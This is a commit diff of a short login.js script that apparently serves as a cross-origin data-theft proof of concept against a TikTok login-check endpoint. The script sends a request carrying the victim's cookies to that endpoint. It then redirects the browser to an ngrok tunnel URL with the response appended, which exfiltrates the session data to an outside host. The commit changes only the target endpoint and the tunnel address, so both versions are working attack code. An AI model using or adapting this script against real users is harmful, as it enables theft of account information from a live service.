bbf31622648f03497e916e1e452d7d4aae2e26b1
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-09-07 04:02:18 +0700

    Update login.js

--- login.js
+++ login.js
@@ -1,10 +1,10 @@
 var xhr = new XMLHttpRequest();
 xhr.onload = reqListener; 
-xhr.open("GET", "https://fp.us.tiktokv.com/check_login/?aid=1583&service=ads.tiktok.com&language=en&appId=1583&lang=en");
+xhr.open("GET", "https://open-api.tiktokv.com/check_login/?aid=1583&service=ads.tiktok.com&language=en&appId=1583&lang=en");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json");
 xhr.send();
 
 function reqListener() {
-    window.location='https://e884-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
+    window.location='https://832a-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
 };
